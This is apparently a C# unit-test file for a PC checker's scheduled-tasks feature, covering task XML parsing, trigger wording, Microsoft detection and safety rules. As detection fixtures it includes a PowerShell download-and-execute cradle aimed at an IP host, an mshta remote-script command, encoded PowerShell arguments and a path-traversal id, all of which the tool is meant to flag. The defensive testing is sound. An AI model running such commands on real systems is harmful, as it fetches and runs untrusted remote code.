using System.Text;
using PcChecker.Core.Processes;
using PcChecker.Core.ScheduledTasks;
using Xunit;

namespace PcChecker.Core.Tests;

/// <summary>Scheduled tasks page: XML parsing, triggers and results in plain words, warnings, Microsoft detection and the safety rules.</summary>
public class ScheduledTasksTests
{
    private static readonly SignatureInfo Unsigned = new(SignatureState.Unsigned, null);
    private static readonly SignatureInfo MicrosoftSigned = new(SignatureState.Signed, "Microsoft Windows");

    private static SignatureInfo Signed(string publisher) => new(SignatureState.Signed, publisher);

    // A Google updater as Task Scheduler stores it on a German Windows (description in German, schema in English).
    private const string GoogleUpdateXml = """
        <?xml version="1.0" encoding="UTF-16"?>
        <Task version="1.3" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
          <RegistrationInfo>
            <Version>1.3.36.372</Version>
            <Description>Hält Ihre Google-Software auf dem neuesten Stand. Wenn diese Aufgabe deaktiviert wird, ist die Software nicht aktuell.</Description>
            <URI>\GoogleUpdateTaskMachineCore{8C5E7F64-2A1B-4C9F-9E61-0D2D1B7A3E10}</URI>
          </RegistrationInfo>
          <Triggers>
            <LogonTrigger>
              <Enabled>true</Enabled>
            </LogonTrigger>
            <CalendarTrigger>
              <Repetition>
                <Interval>PT1H</Interval>
                <Duration>P1D</Duration>
              </Repetition>
              <StartBoundary>2023-02-14T09:12:00</StartBoundary>
              <Enabled>true</Enabled>
              <ScheduleByDay>
                <DaysInterval>1</DaysInterval>
              </ScheduleByDay>
            </CalendarTrigger>
          </Triggers>
          <Principals>
            <Principal id="Author">
              <UserId>S-1-5-18</UserId>
              <RunLevel>HighestAvailable</RunLevel>
            </Principal>
          </Principals>
          <Settings>
            <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
            <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
            <Enabled>true</Enabled>
            <Hidden>false</Hidden>
            <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>
          </Settings>
          <Actions Context="Author">
            <Exec>
              <Command>"C:\Program Files (x86)\Google\Update\GoogleUpdate.exe"</Command>
              <Arguments>/c</Arguments>
            </Exec>
          </Actions>
        </Task>
        """;

    // One of Windows' own tasks on a Russian Windows: a resource-string author, a COM handler and two triggers.
    private const string WindowsTaskXml = """
        <?xml version="1.0" encoding="UTF-16"?>
        <Task version="1.6" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
          <RegistrationInfo>
            <Source>$(@%SystemRoot%\system32\defragsvc.dll,-801)</Source>
            <Author>Корпорация Майкрософт</Author>
            <Description>Оптимизация локальных дисков.</Description>
            <URI>\Microsoft\Windows\Defrag\ScheduledDefrag</URI>
          </RegistrationInfo>
          <Principals>
            <Principal id="LocalSystem">
              <UserId>S-1-5-18</UserId>
            </Principal>
          </Principals>
          <Settings>
            <Hidden>true</Hidden>
            <Enabled>false</Enabled>
          </Settings>
          <Triggers>
            <IdleTrigger />
            <CalendarTrigger>
              <StartBoundary>2024-01-03T01:00:00Z</StartBoundary>
              <ScheduleByWeek>
                <WeeksInterval>2</WeeksInterval>
                <DaysOfWeek><Wednesday /><Monday /></DaysOfWeek>
              </ScheduleByWeek>
            </CalendarTrigger>
          </Triggers>
          <Actions Context="LocalSystem">
            <ComHandler>
              <ClassId>{A6BA00FE-40E8-477C-B713-C64A14F28F6E}</ClassId>
              <Data>defrag</Data>
            </ComHandler>
            <Exec>
              <Command>%windir%\system32\defrag.exe</Command>
              <Arguments>-c -h -o -$</Arguments>
            </Exec>
          </Actions>
        </Task>
        """;

    [Fact]
    public void Parses_a_third_party_task_with_triggers_principal_and_action()
    {
        var task = TaskDefinitionParser.Parse(GoogleUpdateXml);

        Assert.NotNull(task);
        Assert.Null(task.Author);
        Assert.StartsWith("Hält Ihre Google-Software", task.Description);
        Assert.Equal(2, task.Triggers.Count);
        Assert.Equal(TaskTriggerKind.Logon, task.Triggers[0].Kind);
        var daily = task.Triggers[1];
        Assert.Equal(TaskTriggerKind.Daily, daily.Kind);
        Assert.Equal(new DateTime(2023, 2, 14, 9, 12, 0), daily.Start);
        Assert.Equal(TimeSpan.FromHours(1), daily.RepeatEvery);
        Assert.Equal(TimeSpan.FromDays(1), daily.RepeatFor);
        Assert.Equal("S-1-5-18", task.UserId);
        Assert.True(task.HighestPrivileges);
        Assert.False(task.Hidden);
        Assert.True(task.Enabled);
        var action = Assert.Single(task.Actions);
        Assert.Equal("\"C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe\"", action.Command);
        Assert.Equal("/c", action.Arguments);
        Assert.Equal(@"\GoogleUpdateTaskMachineCore{8C5E7F64-2A1B-4C9F-9E61-0D2D1B7A3E10}", task.Uri);
    }

    [Fact]
    public void Parses_a_windows_task_with_a_non_english_author_and_utc_start()
    {
        var task = TaskDefinitionParser.Parse(WindowsTaskXml, TimeZoneInfo.Utc);

        Assert.NotNull(task);
        Assert.Equal("Корпорация Майкрософт", task.Author);
        Assert.True(task.Hidden);
        Assert.False(task.Enabled);
        Assert.Equal(TaskTriggerKind.Idle, task.Triggers[0].Kind);
        var weekly = task.Triggers[1];
        Assert.Equal(TaskTriggerKind.Weekly, weekly.Kind);
        Assert.Equal(2, weekly.Interval);
        Assert.Equal([DayOfWeek.Monday, DayOfWeek.Wednesday], weekly.DaysOfWeek);
        Assert.Equal(new DateTime(2024, 1, 3, 1, 0, 0), weekly.Start);
        Assert.Equal(TaskActionKind.ComHandler, task.Actions[0].Kind);
        Assert.Equal(@"%windir%\system32\defrag.exe", task.FirstProgram?.Command);
        Assert.Equal("Every 2 weeks on Mon, Wed at 01:00", TaskTriggerText.Describe(weekly));
    }

    [Fact]
    public void Parses_the_schtasks_one_document_list_with_path_comments()
    {
        var one = "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n<Tasks>\n  <!-- \\Vendor\\Updater -->\n"
                  + Body(GoogleUpdateXml) + "\n  <!-- \\Microsoft\\Windows\\Defrag\\ScheduledDefrag -->\n" + Body(WindowsTaskXml) + "\n</Tasks>";

        var tasks = TaskDefinitionParser.ParseList(one);

        Assert.Equal(2, tasks.Count);
        Assert.Equal(@"\Vendor\Updater", tasks[0].Path);
        Assert.Equal(@"\Microsoft\Windows\Defrag\ScheduledDefrag", tasks[1].Path);
        Assert.Equal("Корпорация Майкрософт", tasks[1].Definition.Author);

        static string Body(string xml) => xml[(xml.IndexOf("?>", StringComparison.Ordinal) + 2)..];
    }

    [Theory]
    [InlineData("")]
    [InlineData("not xml")]
    [InlineData("<Root/>")]
    [InlineData("<!DOCTYPE Task [<!ENTITY x \"y\">]><Task>&x;</Task>")]
    public void Refuses_text_that_is_not_a_task_definition(string xml) => Assert.Null(TaskDefinitionParser.Parse(xml));

    [Fact]
    public void Triggers_read_in_plain_words()
    {
        var start = new DateTime(2024, 5, 1, 3, 0, 0);
        Assert.Equal("At log on", TaskTriggerText.Describe(new TaskTrigger(TaskTriggerKind.Logon)));
        Assert.Equal("At log on of alex", TaskTriggerText.Describe(new TaskTrigger(TaskTriggerKind.Logon) { UserId = @"PC\alex" }));
        Assert.Equal("At startup", TaskTriggerText.Describe(new TaskTrigger(TaskTriggerKind.Boot)));
        Assert.Equal("When idle", TaskTriggerText.Describe(new TaskTrigger(TaskTriggerKind.Idle)));
        Assert.Equal("Daily at 03:00", TaskTriggerText.Describe(new TaskTrigger(TaskTriggerKind.Daily) { Start = start }));
        Assert.Equal("Every 3 days at 03:00", TaskTriggerText.Describe(new TaskTrigger(TaskTriggerKind.Daily) { Start = start, Interval = 3 }));
        Assert.Equal("Monthly on day 1 at 03:00", TaskTriggerText.Describe(new TaskTrigger(TaskTriggerKind.Monthly) { Start = start, DaysOfMonth = [1] }));
        Assert.Equal("Monthly on the last day in Jan, Jul at 03:00",
            TaskTriggerText.Describe(new TaskTrigger(TaskTriggerKind.Monthly) { Start = start, LastDayOfMonth = true, Months = [1, 7] }));
        Assert.Equal("Monthly on the first Monday at 03:00",
            TaskTriggerText.Describe(new TaskTrigger(TaskTriggerKind.MonthlyDayOfWeek) { Start = start, Weeks = ["1"], DaysOfWeek = [DayOfWeek.Monday] }));
        Assert.Equal("Once on 1 May 2024 at 03:00", TaskTriggerText.Describe(new TaskTrigger(TaskTriggerKind.Once) { Start = start }));
        Assert.Equal("When the PC is locked", TaskTriggerText.Describe(new TaskTrigger(TaskTriggerKind.SessionStateChange) { StateChange = "SessionLock" }));
        Assert.Equal("Daily at 03:00, then every hour for 1 day",
            TaskTriggerText.Describe(new TaskTrigger(TaskTriggerKind.Daily) { Start = start, RepeatEvery = TimeSpan.FromHours(1), RepeatFor = TimeSpan.FromDays(1) }));
        Assert.Equal("At log on, 5 minutes later (off)",
            TaskTriggerText.Describe(new TaskTrigger(TaskTriggerKind.Logon) { Delay = TimeSpan.FromMinutes(5), Enabled = false }));
        Assert.Equal("Only when started by hand or by a program", TaskTriggerText.Summary([]));
    }

    [Fact]
    public void Durations_and_start_times_are_read_from_iso_text()
    {
        Assert.Equal(TimeSpan.FromMinutes(30), TaskDefinitionParser.Duration("PT30M"));
        Assert.Equal(TimeSpan.FromDays(1), TaskDefinitionParser.Duration("P1D"));
        Assert.Null(TaskDefinitionParser.Duration("soon"));
        Assert.Null(TaskDefinitionParser.Duration("PT0S"));
        Assert.Equal(new DateTime(2024, 3, 1, 22, 0, 0), TaskDefinitionParser.ParseStart("2024-03-01T23:00:00+01:00", TimeZoneInfo.Utc));
        Assert.Equal("every 15 minutes", TaskTriggerText.Every(TimeSpan.FromMinutes(15)));
        Assert.Equal("every day", TaskTriggerText.Every(TimeSpan.FromDays(1)));
        Assert.Equal("1 hour 30 minutes", TaskTriggerText.Words(TimeSpan.FromMinutes(90)));
    }

    [Fact]
    public void Result_codes_are_plain_words()
    {
        var ran = DateTimeOffset.Now;
        Assert.Equal("OK", TaskResultText.Describe(0, ran));
        Assert.Equal("Has not run yet", TaskResultText.Describe(0, null));
        Assert.Equal("Running now", TaskResultText.Describe(0x41301, ran));
        Assert.Equal("Not started: it was already running", TaskResultText.Describe(unchecked((int)0x8004131F), ran));
        Assert.Equal("Failed: the program it runs was not found", TaskResultText.Describe(unchecked((int)0x80070002), ran));
        Assert.Equal("The program ended with code 1", TaskResultText.Describe(1, ran));
        Assert.Equal("Error 0x80041309: The task's trigger is not found", TaskResultText.Describe(unchecked((int)0x80041309), ran, _ => "The task's trigger is not found."));
        Assert.Equal("Error 0xC0000005", TaskResultText.Describe(unchecked((int)0xC0000005), ran, _ => "Unknown error (0xc0000005)"));
        Assert.Equal(5, TaskResultText.MessageCode(unchecked((int)0x80070005)));
        Assert.Equal(unchecked((int)0x80041309), TaskResultText.MessageCode(unchecked((int)0x80041309)));
        Assert.False(TaskResultText.IsProblem(0x41301));
        Assert.True(TaskResultText.IsProblem(1));
    }

    [Fact]
    public void Flags_programs_in_writable_folders_only_when_not_signed()
    {
        var def = Definition(@"C:\Users\Alex\AppData\Roaming\PDFConverter\updater.exe", "/silent");
        var unsigned = TaskSuspicionRules.Evaluate(@"\PDFConverterUpdater", def, @"C:\Users\Alex\AppData\Roaming\PDFConverter\updater.exe", Unsigned, false);
        Assert.Contains("Runs a program from AppData, a folder any program can write to", unsigned);
        Assert.Contains(TaskSuspicionRules.UnsignedReason, unsigned);

        var signed = TaskSuspicionRules.Evaluate(@"\Opera scheduled Autoupdate", def, @"C:\Users\Alex\AppData\Local\Programs\Opera\launcher.exe", Signed("Opera Norway AS"), false);
        Assert.Empty(signed);

        Assert.Equal("the Public user folder", TaskSuspicionRules.WritableFolder(@"C:\Users\Public\x.exe"));
        Assert.Equal("the Temp folder", TaskSuspicionRules.WritableFolder(@"%TEMP%\setup.exe"));
        Assert.Null(TaskSuspicionRules.WritableFolder(@"C:\Program Files\App\app.exe"));
    }

    [Theory]
    [InlineData("-NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA", true)]
    [InlineData("-nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA", true)]
    [InlineData("-e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA", true)]
    [InlineData("-Command [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($x))", true)]
    [InlineData("-ExecutionPolicy Bypass -File \"C:\\Program Files\\Vendor\\update.ps1\"", false)]
    [InlineData("-enc short", false)]
    public void Recognises_encoded_powershell_commands(string arguments, bool encoded) =>
        Assert.Equal(encoded, TaskSuspicionRules.IsEncodedCommand(arguments));

    [Fact]
    public void Flags_script_hosts_that_download_code_and_hidden_third_party_tasks()
    {
        var cradle = Definition("powershell.exe", "-c IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.9/a.ps1')", hidden: true);
        var reasons = TaskSuspicionRules.Evaluate(@"\Updater", cradle, @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", MicrosoftSigned, false);
        Assert.Contains(TaskSuspicionRules.DownloadReason, reasons);
        Assert.Contains(TaskSuspicionRules.HiddenReason, reasons);

        var mshta = Definition("mshta.exe", "https://example.com/x.hta");
        Assert.Contains(TaskSuspicionRules.DownloadReason, TaskSuspicionRules.Evaluate(@"\X", mshta, null, SignatureInfo.Unknown, false));

        // Windows hides many of its own tasks; that alone is not a warning.
        var windows = Definition(@"%windir%\system32\defrag.exe", "-c", hidden: true);
        Assert.Empty(TaskSuspicionRules.Evaluate(@"\Microsoft\Windows\Defrag\ScheduledDefrag", windows, @"C:\Windows\system32\defrag.exe", MicrosoftSigned, true));

        var vbs = Definition(@"C:\Windows\System32\wscript.exe", "\"C:\\Users\\Alex\\AppData\\Local\\Temp\\run.vbs\"");
        Assert.Contains("Runs a script from AppData, a folder any program can write to",
            TaskSuspicionRules.Evaluate(@"\Run", vbs, @"C:\Windows\System32\wscript.exe", MicrosoftSigned, false));
    }

    [Fact]
    public void Microsoft_tasks_are_recognised_by_folder_or_author_but_not_by_claim_alone()
    {
        Assert.True(TaskPublisherRules.IsMicrosoft(@"\Microsoft\Windows\Defrag\ScheduledDefrag", null, SignatureInfo.Unknown));
        Assert.True(TaskPublisherRules.IsMicrosoft(@"\MicrosoftEdgeUpdateTaskMachineUA", "Microsoft Corporation", Signed("Microsoft Corporation")));
        Assert.True(TaskPublisherRules.IsMicrosoft(@"\OneDrive Reporting Task", "Корпорация Майкрософт", Signed("Microsoft Corporation")));
        Assert.True(TaskPublisherRules.IsMicrosoftAuthor("$(@%SystemRoot%\\system32\\wininet.dll,-16000)"));

        // Says it is Microsoft, but its program is unsigned or signed by someone else.
        Assert.False(TaskPublisherRules.IsMicrosoft(@"\WindowsUpdateHelper", "Microsoft Corporation", Unsigned));
        Assert.False(TaskPublisherRules.IsMicrosoft(@"\Microsoft\Windows\Fake", null, Signed("Shady Software Ltd")));

        // A task that runs a Microsoft program (PowerShell) is not Microsoft's.
        Assert.False(TaskPublisherRules.IsMicrosoft(@"\SystemHealthMonitor", @"PC\Alex", MicrosoftSigned));
        Assert.False(TaskPublisherRules.IsMicrosoft(@"\Buffalo\NAS Navigator", "株式会社バッファロー", Signed("BUFFALO INC.")));

        Assert.Equal("BUFFALO INC.", TaskPublisherRules.Display(@"\Buffalo\NAS Navigator", "株式会社バッファロー", Signed("BUFFALO INC."), false));
        Assert.Equal("株式会社バッファロー", TaskPublisherRules.Display(@"\Buffalo\NAS Navigator", "株式会社バッファロー", SignatureInfo.Unknown, false));
        Assert.Equal("Microsoft", TaskPublisherRules.Display(@"\Microsoft\Windows\X", "$(@%SystemRoot%\\x.dll,-1)", SignatureInfo.Unknown, true));
    }

    [Fact]
    public void Safety_rules_keep_windows_tasks_read_only_and_never_delete_microsoft_tasks()
    {
        var windows = Info(@"\Microsoft\Windows\Defrag\ScheduledDefrag", microsoft: true);
        Assert.Equal(TaskSafetyRules.WindowsReadOnlyReason, TaskSafetyRules.ToggleRefusal(windows, advancedMode: false));
        Assert.Null(TaskSafetyRules.ToggleRefusal(windows, advancedMode: true));
        Assert.NotNull(TaskSafetyRules.DeleteRefusal(windows));
        Assert.NotNull(TaskSafetyRules.TurnOffWarning(windows));

        var edge = Info(@"\MicrosoftEdgeUpdateTaskMachineUA", microsoft: true);
        Assert.Null(TaskSafetyRules.ToggleRefusal(edge, advancedMode: false));
        Assert.NotNull(TaskSafetyRules.DeleteRefusal(edge));

        var own = Info(@"\PC Checker\Health check");
        Assert.Equal(TaskSafetyRules.OwnTaskReason, TaskSafetyRules.DeleteRefusal(own));
        Assert.Equal(TaskSafetyRules.OwnTaskReason, TaskSafetyRules.ToggleRefusal(own, true));

        var vendor = Info(@"\Adobe Acrobat Update Task");
        Assert.Null(TaskSafetyRules.DeleteRefusal(vendor));
        Assert.Null(TaskSafetyRules.RunRefusal(vendor, false));
        Assert.Equal("It is not running.", TaskSafetyRules.EndRefusal(vendor, false));

        // Never start a program from a writable folder with administrator rights.
        var elevated = Info(@"\Updater", program: @"C:\Users\Alex\AppData\Local\Temp\u.exe", user: "S-1-5-18");
        Assert.Contains("administrator rights", TaskSafetyRules.RunRefusal(elevated, true));
        var disabled = vendor with { State = TaskRunState.Disabled };
        Assert.Equal("The task is turned off. Turn it on first.", TaskSafetyRules.RunRefusal(disabled, false));
    }

    [Fact]
    public void The_default_filter_shows_other_companies_and_anything_flagged()
    {
        var tasks = new[]
        {
            Info(@"\Microsoft\Windows\Defrag\ScheduledDefrag", microsoft: true),
            Info(@"\Adobe Acrobat Update Task"),
            Info(@"\Microsoft\Windows\Odd", microsoft: true) with { Flags = ["x"] },
            Info(@"\Zoom Updater") with { State = TaskRunState.Disabled },
        };

        Assert.Equal([@"\Microsoft\Windows\Odd", @"\Adobe Acrobat Update Task", @"\Zoom Updater"],
            TaskSafetyRules.Filter(tasks, TaskListFilter.NotMicrosoft, null).Select(t => t.Path));
        Assert.Equal(2, TaskSafetyRules.Filter(tasks, TaskListFilter.Microsoft, null).Count);
        Assert.Equal(4, TaskSafetyRules.Filter(tasks, TaskListFilter.All, null).Count);
        Assert.Equal(@"\Zoom Updater", Assert.Single(TaskSafetyRules.Filter(tasks, TaskListFilter.TurnedOff, null)).Path);
        Assert.Equal(@"\Adobe Acrobat Update Task", Assert.Single(TaskSafetyRules.Filter(tasks, TaskListFilter.All, "acrobat update")).Path);
    }

    [Fact]
    public void Action_and_account_text_and_program_paths()
    {
        var def = Definition("\"%ProgramFiles%\\Vendor\\app.exe\"", "--update", user: "S-1-5-18", highest: true);
        Assert.Equal("\"%ProgramFiles%\\Vendor\\app.exe\" --update", TaskActionText.Describe(def));
        Assert.Equal("SYSTEM", TaskActionText.RunsAs(def));
        Assert.True(TaskActionText.RunsElevated(def));
        Assert.Equal("alex (highest privileges)", TaskActionText.RunsAs(Definition("a.exe", null, user: @"PC\alex", highest: true)));
        Assert.Equal("Every user who signs in", TaskActionText.RunsAs(Definition("a.exe", null) with { GroupId = "S-1-5-32-545" }));

        string? Env(string name) => name.ToUpperInvariant() switch
        {
            "PROGRAMFILES" => @"C:\Program Files",
            "WINDIR" => @"C:\Windows",
            _ => null,
        };
        var existing = new HashSet<string>(StringComparer.OrdinalIgnoreCase) { @"C:\Windows\System32\rundll32.exe", @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" };
        Assert.Equal(@"C:\Program Files\Vendor\app.exe", TaskActionText.ProgramPath("\"%ProgramFiles%\\Vendor\\app.exe\"", Env, @"C:\Windows", existing.Contains));
        Assert.Equal(@"C:\Windows\System32\rundll32.exe", TaskActionText.ProgramPath("rundll32.exe", Env, @"C:\Windows", existing.Contains));
        Assert.Equal(@"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", TaskActionText.ProgramPath("powershell", Env, @"C:\Windows", existing.Contains));
        Assert.Null(TaskActionText.ProgramPath(@"sub\tool.exe", Env, @"C:\Windows", existing.Contains));
        Assert.Equal("%UNKNOWN%\\x", TaskActionText.Expand("%UNKNOWN%\\x", Env));
    }

    [Fact]
    public void Backups_have_safe_ids_paths_and_a_utf16_body()
    {
        var created = new DateTimeOffset(2026, 10, 27, 14, 30, 5, TimeSpan.Zero);
        var id = TaskBackupNaming.BackupId(created, @"\Adobe Acrobat Update Task");
        Assert.StartsWith("task-", id);
        Assert.EndsWith("-adobe-acrobat-update-task", id);
        Assert.True(TaskBackupNaming.IsValidId(id));
        Assert.False(TaskBackupNaming.IsValidId(@"task-..\..\evil"));
        Assert.True(TaskBackupNaming.IsRestorablePath(@"\Vendor\Updater"));
        Assert.False(TaskBackupNaming.IsRestorablePath(@"\Microsoft\Windows\Defrag\ScheduledDefrag"));
        Assert.False(TaskBackupNaming.IsRestorablePath(@"\PC Checker\Start"));

        var bytes = TaskBackupNaming.Encode("<Task/>");
        Assert.Equal(new byte[] { 0xFF, 0xFE }, bytes[..2]);
        Assert.Equal("<Task/>", Encoding.Unicode.GetString(bytes, 2, bytes.Length - 2));
        var seal = TaskBackupNaming.Seal(bytes, @"\Vendor\Updater");
        Assert.True(TaskBackupNaming.SealMatches(bytes, @"\Vendor\Updater", seal));
        Assert.False(TaskBackupNaming.SealMatches(bytes, @"\Vendor\Other", seal));

        var json = TaskBackupNaming.Serialize([new TaskBackupEntry(id, created, @"\Vendor\Updater", false), new TaskBackupEntry("../x", created, @"\Vendor\X", false)]);
        var back = Assert.Single(TaskBackupNaming.Deserialize(json));
        Assert.Equal(id, back.Id);
        Assert.Equal("Updater", back.Name);
        Assert.Empty(TaskBackupNaming.Deserialize("{ not json"));
    }

    [Fact]
    public void Analysis_adds_a_note_for_a_missing_program_and_task_paths_split()
    {
        var info = TaskAnalysis.Complete(Info(@"\Dropbox Update Task"), @"C:\Program Files (x86)\Dropbox\Update\DropboxUpdate.exe", false, SignatureInfo.Unknown);
        Assert.Contains(TaskAnalysis.MissingProgramNote, info.Notes);
        Assert.False(info.IsMicrosoft);
        Assert.Equal("Dropbox Update Task", info.Name);
        Assert.Equal(@"\", info.Folder);
        Assert.Equal(@"\Microsoft\Windows\Defrag", TaskPaths.FolderOf(@"\Microsoft\Windows\Defrag\ScheduledDefrag"));
        Assert.True(TaskPaths.IsPcCheckerTask(@"\PC Checker\Start"));
        Assert.Null(TaskAnalysis.RealDate(new DateTime(1899, 12, 30)));
        Assert.Contains("duckduckgo.com", TaskAnalysis.SearchUrl(info));
    }

    private static TaskDefinition Definition(string command, string? arguments, bool hidden = false, string? user = null, bool highest = false) =>
        new(null, null, [new TaskTrigger(TaskTriggerKind.Logon)], [new TaskAction(TaskActionKind.Exec, command, arguments)], user, null, "InteractiveToken", highest, hidden, true);

    private static ScheduledTaskInfo Info(string path, bool microsoft = false, string? program = null, string? user = null) =>
        new ScheduledTaskInfo(path, TaskRunState.Ready, null, null, null, Definition(program ?? @"C:\Program Files\App\app.exe", null, user: user))
        {
            IsMicrosoft = microsoft,
            ProgramPath = program ?? @"C:\Program Files\App\app.exe",
        };
}
